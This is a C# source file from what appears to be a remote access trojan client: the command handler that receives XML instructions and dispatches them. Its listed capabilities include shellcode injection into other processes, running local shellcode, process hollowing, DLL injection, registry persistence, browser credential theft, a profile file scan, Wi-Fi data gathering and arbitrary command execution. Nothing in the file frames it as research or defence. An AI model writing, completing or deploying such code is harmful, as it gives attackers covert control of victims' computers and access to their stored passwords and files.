using RatClient.WebGather;
using RatClient.ProcManage;
using System;
using System.Xml;
using System.Text;
using System.IO;

namespace RatClient
{
    public class FilterCommands
    {
        public static XmlDocument xmlDoc;
        public FilterCommands()
        {
            xmlDoc = new XmlDocument();
        }

		public struct CommandIdentifiers
		{
			public const string LIST_PROCESS_INFORMATION = "be425fd08e9ea24230bac47493228ada";
			public const string INJECT_PROCESS_SHELLCODE = "aea87b24517d08c8ff13601406a0202e";
			public const string RUN_LOCAL_SHELLCODE      = "2dbab3bcba2fe64f1d2133bc50796496";
			public const string POWERSHELL_CONSOLE       = "adfd9a3aa5bc568d540db256a3782c04";
			public const string HOLLOW_FILE_EXEC         = "b11c081208b1d6466c83e37098510d73";
			public const string WEB_CREDENTIALS          = "5df297c2f2da83a8b45cfd012fbf9b3c";
			public const string FILES_SNAP_FULL          = "ce52e112fb976b2d277f09b6eada379f";
			public const string WIFI_INFO_BASE           = "46f2b694bd6669fb14bed11c52e0d91d";
			public const string WIFI_INFO_FULL           = "2d6694963cce74d2791fa72538152c11";
			public const string PERSITENCE               = "e5fcfe07178a109ea0c1e9bd7e9dd772";
			public const string DLL_INJECT               = "70d78a787fc59a5deb9578a58102ae2d";
			public const string CHANGE_CWD               = "3f1ba9eb608addfb46dac5b51f4a6d87";
		}

		public byte[] Run(string data)
		{
			xmlDoc.LoadXml(data);
			string command = xmlDoc.SelectSingleNode("/root/command").InnerText;
			if (command == string.Empty)
			{
				return null;
			}
			else if (command == CommandIdentifiers.WEB_CREDENTIALS)
			{
				string type = xmlDoc.SelectSingleNode("/root/type").InnerText;
				string web = xmlDoc.SelectSingleNode("/root/web").InnerText;
				return Passwords.Gather(web, type);
			}
			else if (command == CommandIdentifiers.LIST_PROCESS_INFORMATION)
			{
				return ProcInfo.GetFormatedProcesses();
			}
			else if (command == CommandIdentifiers.INJECT_PROCESS_SHELLCODE)
			{
				byte[] shellonBase = Convert.FromBase64String(xmlDoc.SelectSingleNode("/root/shellonbase").InnerText);
				int targetPid = int.Parse(xmlDoc.SelectSingleNode("/root/targetPid").InnerText);
				bool test = Tools.InjectProcess(shellonBase, procid: targetPid);
				if (test)
				{
					return new byte[1] { 48 };
				}
				return new byte[1] { 49 };
			}
			else if (command == CommandIdentifiers.RUN_LOCAL_SHELLCODE)
			{
				byte[] shellcode = Convert.FromBase64String(xmlDoc.SelectSingleNode("/root/shellonbase").InnerText);
				if (Tools.RunShellCode(shellcode))
				{
					return new byte[1] { 48 };
				}
				return new byte[1] { 49 };
			}
			else if (command == CommandIdentifiers.PERSITENCE)
			{
				string action = xmlDoc.SelectSingleNode("/root/action").InnerText;
				string name = xmlDoc.SelectSingleNode("/root/name").InnerText;
				if (Info.PersistActionsReg[action](name))
				{
					return new byte[1] { 48 };
				}
				return new byte[1] { 49 };
			}
			else if (command == CommandIdentifiers.FILES_SNAP_FULL)
			{
				string path = xmlDoc.SelectSingleNode("/root/path").InnerText.Trim();
				if (path == "default")
				{
					Console.WriteLine("default was call");
					path = Environment.GetFolderPath(System.Environment.SpecialFolder.UserProfile);
				}
				Console.WriteLine($"Processing {path} ...");
				byte[] result = Encoding.UTF8.GetBytes(Mtool.FileExp.EXP.GetValidExeAndDir(path));
				Console.WriteLine("End Processig Files");
				return result;
			}
			else if (command == CommandIdentifiers.HOLLOW_FILE_EXEC)
			{
				string exePath = Path.Combine(
					xmlDoc.SelectSingleNode("/root/path").InnerText,
					xmlDoc.SelectSingleNode("/root/file").InnerText
				);
				Console.WriteLine($"Processing path {exePath}");
				byte[] exePayload = Convert.FromBase64String(
					xmlDoc.SelectSingleNode("/root/exeonbase").InnerText);
				return Tools.ProcessHollowing(exePath, exePayload) ? new byte[1] { 48 } : new byte[1] { 49 };
			}
			else if (command == CommandIdentifiers.DLL_INJECT)
			{
				int pid = int.Parse(xmlDoc.SelectSingleNode("/root/targetPid").InnerText);
				byte[] payload = Convert.FromBase64String(xmlDoc.SelectSingleNode("/root/dllonbase").InnerText);
				return Tools.DllInjection(pid, payload) ? new byte[1] { 48 } : new byte[1] { 49 };
			}
			else if (command == CommandIdentifiers.CHANGE_CWD)
			{
				string path = xmlDoc.SelectSingleNode("/root/path").InnerText;
				Directory.SetCurrentDirectory(path);
				return Encoding.UTF8.GetBytes($"{Directory.GetCurrentDirectory()}>");
			}
			else if (command == CommandIdentifiers.POWERSHELL_CONSOLE)
			{
				Info.MainShell = "powershell.exe";
				return Tools.RunCommand("powershell", addCd: true);
			}
			else if (command == CommandIdentifiers.WIFI_INFO_BASE)
			{
				Mtool.WifiInfo wifi = new Mtool.WifiInfo();
				return Encoding.UTF8.GetBytes(wifi.GetJsonInfo());
			}
			else if (command == CommandIdentifiers.WIFI_INFO_FULL)
			{
				return new Mtool.WifiInfo().FullReport();
			}
			else
			{
				var node = xmlDoc.SelectSingleNode("/root/getcd");
				bool addCd = node != null && !string.IsNullOrEmpty(node.InnerText);
				if (addCd)
				{
					Console.WriteLine("Adding cd");
				}
				return Tools.RunCommand(command, addCd: addCd);
			}
		}

	}
}
